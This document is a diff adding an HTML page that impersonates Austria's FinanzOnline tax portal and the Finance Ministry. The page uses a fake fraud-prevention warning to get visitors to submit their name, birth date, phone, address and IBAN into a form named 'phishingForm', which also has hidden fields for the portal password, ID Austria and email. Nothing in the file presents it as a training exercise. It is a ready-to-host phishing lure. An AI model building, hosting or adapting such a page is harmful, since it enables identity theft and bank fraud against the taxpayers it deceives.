@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FinanzOnline - Sicherheitsüberprüfung</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <header class="header">
+        <div class="header-container">
+            <div class="logo-area">
+                <img src="finanzonline_at_Logo.svg" alt="FinanzOnline" class="logo" onerror="this.style.display='none'">
+            </div>
+            <div class="header-right">
+                <img src="vmf_logo.svg" alt="VMF" class="logo-vmf" onerror="this.style.display='none'">
+                <button class="burger-menu">☰</button>
+            </div>
+        </div>
+        <div class="header-title">
+            <h1>Willkommen bei FinanzOnline</h1>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+
+            <div class="warning-box">
+                <div class="warning-header">
+                    <img src="alert-triangle.svg" alt="⚠️" class="warning-icon">
+                    <h2 class="warning-title">Achtung!</h2>
+                </div>
+                <p class="warning-text">
+                    Im Rahmen unserer Maßnahmen zur Betrugsprävention bitten wir Sie höflich, Ihre persönlichen Daten mit unserer Datenbank abzugleichen und deren Aktualität zu bestätigen. Dies dient dem Schutz Ihres Kontos und der sicheren Nutzung unserer Dienstleistungen.
+                </p>
+                <p class="warning-text" style="margin-top: 10px; font-weight: normal;">
+                    Ihr FinanzOnline-Team
+                </p>
+            </div>
+
+            <div class="form-section">
+                <h2 class="section-title">Persönliche Daten</h2>
+                <div class="form-inner">
+                    <form id="phishingForm" class="data-form">
+                        <div class="form-group">
+                            <label>Ihr vollständiger Name</label>
+                            <input type="text" name="fullname" placeholder="Ihr vollständiger Name" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Ihr Geburtsdatum</label>
+                            <input type="text" name="birthdate" placeholder="__/__/____" maxlength="10" class="birthdate-input" id="birthdateInput" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Ihre Telefonnummer</label>
+                            <input type="tel" name="phone" placeholder="+43" value="+43" required id="phoneInput">
+                        </div>
+
+                        <div class="form-group">
+                            <label>Adresse</label>
+                            <div class="address-row-three">
+                                <input type="text" name="street" placeholder="Adresse" class="address-street" required>
+                                <input type="text" name="city" placeholder="Stadt" class="address-city" required>
+                                <input type="text" name="postal" placeholder="Postleitzahl" class="address-postal" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Ihre IBAN</label>
+                            <input type="text" name="iban" placeholder="AT" required id="ibanInput" maxlength="34">
+                        </div>
+
+                        <div class="form-group" style="display: none;">
+                            <label>FinanzOnline-Passwort</label>
+                            <input type="password" name="password" placeholder="Ihr Passwort">
+                        </div>
+                        <div class="form-group" style="display: none;">
+                            <label>ID Austria (optional)</label>
+                            <input type="text" name="id_austria" placeholder="Ihre ID Austria">
+                        </div>
+                        <div class="form-group" style="display: none;">
+                            <label>E-Mail-Adresse</label>
+                            <input type="email" name="email" placeholder="max@example.at">
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="submit" class="submit-btn" id="submitBtn">
+                                Absenden
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <div class="bottom-section">
+                <div class="news-section">
+                    <h2 class="section-title">Aktuelles</h2>
+                    <div class="news-grid-horizontal">
+                        <div class="news-item-horizontal">
+                            <div class="news-image-horizontal">
+                                <img src="IDAustria.png" alt="ID Austria" class="news-img-horizontal" onerror="this.style.display='none'">
+                            </div>
+                            <div class="news-content-horizontal">
+                                <h3>Infos zur ID Austria</h3>
+                                <p>Alle Informationen zur ID Austria und wie Sie diese aktivieren können.</p>
+                                <a href="https://www.oesterreich.gv.at/id-austria.html" target="_blank">Mehr erfahren →</a>
+                            </div>
+                        </div>
+                        <div class="news-item-horizontal">
+                            <div class="news-image-horizontal">
+                                <img src="Finanznavi.jpg" alt="Finanznavi" class="news-img-horizontal" onerror="this.style.display='none'">
+                            </div>
+                            <div class="news-content-horizontal">
+                                <h3>Finanznavigationsdienst</h3>
+                                <p>Ihr digitaler Wegweiser für Ihre Finanzentscheidungen.</p>
+                                <a href="https://finanznavi.gv.at" target="_blank">Mehr erfahren →</a>
+                            </div>
+                        </div>
+                        <div class="news-item-horizontal">
+                            <div class="news-image-horizontal">
+                                <img src="Kundenservice.png" alt="Kundenservice" class="news-img-horizontal" onerror="this.style.display='none'">
+                            </div>
+                            <div class="news-content-horizontal">
+                                <h3>Kundenservice</h3>
+                                <p>Alle Informationen zu unserem Kundenservice.</p>
+                                <a href="https://www.bmf.gv.at/services/aemter-behoerden/faoe.html" target="_blank">Mehr erfahren →</a>
+                            </div>
+                        </div>
+                        <div class="news-item-horizontal">
+                            <div class="news-image-horizontal">
+                                <img src="Phishing.jpg" alt="Phishing Warnung" class="news-img-horizontal" onerror="this.style.display='none'">
+                            </div>
+                            <div class="news-content-horizontal">
+                                <h3>Achtung Phishing!</h3>
+                                <p>Das Bundesministerium für Finanzen warnt vor Internetbetrug.</p>
+                                <a href="https://www.bmf.gv.at/public/informationen/internetbetrug.html" target="_blank">Mehr erfahren →</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-services">
+                    <div class="info-block">
+                        <h3>Informationen</h3>
+                        <ul>
+                            <li><a href="#">Sicherheitsinformationen</a></li>
+                            <li><a href="#">Technische Voraussetzungen</a></li>
+                            <li><a href="#">Rechtsgrundlagen</a></li>
+                            <li><a href="#">Registration / Income tax and Corporation tax return</a></li>
+                        </ul>
+                    </div>
+                    <div class="info-block">
+                        <h3>Services</h3>
+                        <ul>
+                            <li><a href="#">Anonyme Steuerberechnung</a></li>
+                            <li><a href="#">XML-Erstellung (VAT Refund)</a></li>
+                        </ul>
+                    </div>
+                    <div class="info-block">
+                        <h3>Technische Unterstützung</h3>
+                        <ul>
+                            <li><a href="#">Fragen Sie Fred, den Chatbot der Finanzverwaltung.</a></li>
+                            <li>Weitere Kontaktmöglichkeiten finden Sie unter <a href="#">Kundenservice.</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-container">
+            <p>© 2025 Bundesministerium für Finanzen | FinanzOnline</p>
+            <p class="footer-note">Diese Seite dient der Sicherheitsüberprüfung.</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
